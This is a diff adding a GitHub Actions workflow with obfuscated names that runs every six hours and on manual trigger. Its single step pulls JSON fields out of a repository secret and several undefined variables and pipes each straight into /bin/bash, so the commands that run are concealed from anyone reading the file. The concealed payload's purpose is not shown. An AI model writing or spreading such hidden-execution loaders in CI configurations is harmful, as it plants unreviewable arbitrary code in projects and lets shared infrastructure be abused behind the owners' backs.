@@ -1,0 +1,24 @@
+name: cxzhiboma
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cxzhiboma
+        env:
+          eusk7: ${{ secrets.eusk7 }}
+        run: |
+          echo $eusk7 | jq -r .ir7181 | /bin/bash
+          echo $wheqf46 | jq -r .lrnby5743 | /bin/bash
+          echo $r07601 | jq -r .gnn8475 | /bin/bash
+          echo $tr31 | jq -r .vd11752 | /bin/bash
+          echo $hos8 | jq -r .ku8 | /bin/bash
+          echo $dhtdm92317 | jq -r .geps127 | /bin/bash
+          echo $qnj7 | jq -r .k83 | /bin/bash
+
